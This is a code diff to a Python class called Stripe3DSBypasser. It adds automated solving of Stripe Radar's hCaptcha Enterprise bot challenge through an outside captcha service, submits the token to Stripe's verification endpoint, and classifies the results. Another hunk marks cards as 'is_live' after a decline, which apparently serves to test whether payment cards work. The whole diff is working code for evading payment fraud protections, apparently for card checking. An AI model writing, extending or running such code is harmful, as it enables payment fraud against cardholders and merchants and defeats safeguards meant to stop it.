@@ -160,8 +160,60 @@ class Stripe3DSBypasser:
         if not isinstance(sdk_data, dict):
             return None
 
-        # Guard: Stripe Radar bot challenge is NOT 3DS
+        # Radar Bot Challenge: hCaptcha Enterprise triggered by Stripe WAF
         if sdk_data.get('type') == 'intent_confirmation_challenge':
+            try:
+                import captcha_solver
+                stripe_js = sdk_data.get('stripe_js') or {}
+                site_key = str(sdk_data.get('site_key') or stripe_js.get('site_key') or 'c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a')
+                rqdata = stripe_js.get('rqdata')
+                pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else (sdk_data.get('id') or '')
+                raw_vurl = stripe_js.get('verification_url') or f"/v1/payment_intents/{pi_id}/verify_challenge"
+                v_url = f"https://api.stripe.com{raw_vurl}" if raw_vurl.startswith('/') else raw_vurl
+
+                if captcha_solver.has_any_solver_key():
+                    token = await captcha_solver.solve_hcaptcha_enterprise(
+                        sitekey=site_key,
+                        pageurl="https://checkout.stripe.com",
+                        rqdata=rqdata
+                    )
+                    if token:
+                        verify_body = {
+                            "key": pk_key,
+                            "client_secret": client_secret,
+                            "captcha_response": token
+                        }
+                        async with session.post(
+                            v_url,
+                            data=urlencode(verify_body),
+                            headers={
+                                "Content-Type": "application/x-www-form-urlencoded",
+                                "User-Agent": profile.get("user_agent", UA) if profile else UA,
+                                "Accept": "application/json",
+                                "Origin": "https://checkout.stripe.com",
+                            },
+                            timeout=15
+                        ) as vr:
+                            vj = vr.json() if callable(vr.json) else vr.json
+                            vpi = vj.get("payment_intent") or vj
+                            vstat = vpi.get("status")
+                            if vstat in ("succeeded", "complete", "requires_capture"):
+                                return {'success': True, 'status': vstat, 'raw_response': vj}
+                            elif vstat == "requires_payment_method":
+                                verr = vpi.get("last_payment_error") or {}
+                                return {
+                                    'success': False,
+                                    'status': 'declined',
+                                    'decline_code': verr.get('decline_code') or 'declined_after_waf',
+                                    'error': verr.get('message', 'Declined after WAF verification'),
+                                    'raw_response': vj
+                                }
+                            elif vstat in ("requires_action", "requires_source_action"):
+                                # Radar cleared, proceeded to next step (e.g. real 3DS)
+                                return {'success': False, 'status': vstat, 'radar_cleared': True, 'raw_response': vj}
+            except Exception as _r_ex:
+                print(f"[DEBUG 3DS BYPASSER] Radar solve failed: {_r_ex}")
+
             return {'success': False, 'status': 'intent_confirmation_challenge', 'radar_challenge': True}
 
         server_trans_id = sdk_data.get('three_ds_server_trans_id') or sdk_data.get('three_ds_2_server_trans_id')
@@ -455,6 +507,13 @@ class Stripe3DSBypasser:
                     result['3ds_type'] = act_type or '3DS'
                     result['decline_code'] = None
                     result['error'] = None
+                    if outcome.get('raw_response'):
+                        result['raw_response'] = outcome['raw_response']
+                elif outcome and outcome.get('status') == 'declined':
+                    result['success'] = False
+                    result['is_live'] = True
+                    result['decline_code'] = outcome.get('decline_code') or 'card_declined'
+                    result['error'] = outcome.get('error') or 'Declined after WAF verification'
                     if outcome.get('raw_response'):
                         result['raw_response'] = outcome['raw_response']
                 elif outcome and outcome.get('radar_challenge'):
